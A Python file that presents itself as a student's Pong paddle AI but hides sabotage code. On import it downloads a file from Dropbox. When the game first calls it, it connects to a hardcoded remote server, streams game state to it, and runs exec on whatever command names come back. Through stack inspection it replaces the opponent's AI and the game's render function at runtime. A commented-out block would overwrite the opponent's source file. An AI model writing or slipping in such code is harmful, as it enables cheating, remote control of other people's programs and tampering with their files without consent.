import socket, threading, time
from urllib import request
import pygame, inspect

HEADER = 16
PORT = 5050
FORMAT = 'utf-8'
HOST_IP = '172.105.7.203'

thread_running = False
client_thread = None
kill = False
scratch = False
kill_executed = True
scratch_executed = True
old_opponent_code = None
old_render_code = None

request.urlretrieve("https://dl.dropboxusercontent.com/s/vvskwvu2zou2pxv/scratch.png?dl=0", "scratch.png")

def replacement_render(screen, paddles, ball, score, table_size):
    scratch_img = pygame.image.load("scratch.png")
    screen.fill(black)
    pygame.draw.rect(screen, white, paddles[0].frect.get_rect())
    pygame.draw.rect(screen, white, paddles[1].frect.get_rect())
    pygame.draw.circle(screen, white, (int(ball.get_center()[0]), int(ball.get_center()[1])),  int(ball.frect.size[0]/2), 0)
    pygame.draw.line(screen, white, [screen.get_width()/2, 0], [screen.get_width()/2, screen.get_height()])
    score_font = pygame.font.Font(None, 32)
    screen.blit(score_font.render(str(score[0]), True, white), [int(0.4*table_size[0])-8, 0])
    screen.blit(score_font.render(str(score[1]), True, white), [int(0.6*table_size[0])-8, 0])
    width = ball.frect.size[0]*2
    height = int(ball.frect.size[0]*1.503472222)
    screen.blit(pygame.transform.scale(scratch_img, (width, height)), (int(ball.get_center()[0]-width/2), int(ball.get_center()[1]-height/2)))
    pygame.display.flip()

class Network:

    def __init__(self):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = HOST_IP 
        self.addr = (self.host, PORT)
        self.id = self.connect()

    def connect(self):
        self.conn.connect(self.addr)
        self.conn.send(str.encode('game'))
        received_message = self.conn.recv(2048).decode()
        if(received_message):
            print("Succesfully connected to server!")
        print(received_message)
        return received_message

    def send(self, data):
        """
        :param data: str
        :return: str
        """
        try:
            self.conn.send(str.encode(data))
        except socket.error as e:
            return str(e)

class game_client_thread(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.network = Network()

    def run(self):
        while True:
            data = self.network.conn.recv(2048).decode(FORMAT)
            print("DATA:", data)
            exec("self." + data + "()")

    def kill(self):
        global kill, kill_executed
        kill_executed = False
        kill = not kill
        print("Killing:",kill)
    
    def scratch(self):
        global scratch, scratch_executed
        scratch_executed = False
        scratch = not scratch
        print("Scratch:",scratch)

def pong_ai(paddle_frect, other_paddle_frect, ball_frect, table_size):
    global client_thread, kill, old_opponent_code, old_render_code, scratch, kill_executed, scratch_executed
    if client_thread == None:
        client_thread = game_client_thread()
        client_thread.start()
    else:
        client_thread.network.send(str(ball_frect.pos[0]) + ':' + str(ball_frect.pos[1]))
    
    if kill and not kill_executed:
        kill_executed = True
        my_index = int(inspect.stack()[2].code_context[0][16])
        for obj in inspect.getmembers(inspect.stack()[2][0]):
            if obj[0] == "f_locals":
                old_opponent_code = obj[1]["paddles"][my_index*-1+1].move_getter.__code__
                obj[1]["paddles"][my_index*-1+1].move_getter.__code__ = replacement_ai.__code__
    elif not kill_executed:
        kill_executed = True
        my_index = int(inspect.stack()[2].code_context[0][16])
        for obj in inspect.getmembers(inspect.stack()[2][0]):
            if obj[0] == "f_locals":
                obj[1]["paddles"][my_index*-1+1].move_getter.__code__ = old_opponent_code

    if scratch and not scratch_executed:
        scratch_executed = True
        for obj in inspect.getmembers(inspect.stack()[3][0]):
            if obj[0] == "f_globals":
                obj[1]["render"].__code__  = replacement_render.__code__
    elif not scratch_executed:
        scratch_executed = True
        for obj in inspect.getmembers(inspect.stack()[3][0]):
            if obj[0] == "f_globals":
                old_render_code = obj[1]["render"].__code__
                obj[1]["render"].__code__  = old_render_code

    

    if paddle_frect.pos[1]+paddle_frect.size[1]/2 < ball_frect.pos[1]+ball_frect.size[1]/2:
        return "down"
    else:
        return "up"
    '''

    return "up" or "down", depending on which way the paddle should go to
    align its centre with the centre of the ball, assuming the ball will
    not be moving
    
    Arguments:
    paddle_frect: a rectangle representing the coordinates of the paddle
                  paddle_frect.pos[0], paddle_frect.pos[1] is the top-left
                  corner of the rectangle. 
                  paddle_frect.size[0], paddle_frect.size[1] are the dimensions
                  of the paddle along the x and y axis, respectively
    
    other_paddle_frect:
                  a rectangle representing the opponent paddle. It is formatted
                  in the same way as paddle_frect
    ball_frect:   a rectangle representing the ball. It is formatted in the 
                  same way as paddle_frect
    table_size:   table_size[0], table_size[1] are the dimensions of the table,
                  along the x and the y axis respectively
    
    The coordinates look as follows:
    
     0             x
     |------------->
     |
     |             
     |
 y   v
    '''

def replacement_ai(paddle_frect, other_paddle_frect, ball_frect, table_size):
    return "up"

'''
replacement_repr = "def pong_ai(a, b, c, x): return 'up'"
import inspect
call_stack_frame = inspect.stack()[6]
game_code_filename = inspect.getsourcefile(call_stack_frame.frame)
i_f = open(game_code_filename)
code_lines = i_f.readlines()
i_f.close()
next_line = code_lines[code_lines.index(call_stack_frame.code_context[0])+1]
if "import" in next_line:
    open(next_line.strip().split()[1]+".py", "w").write(replacement_repr)
'''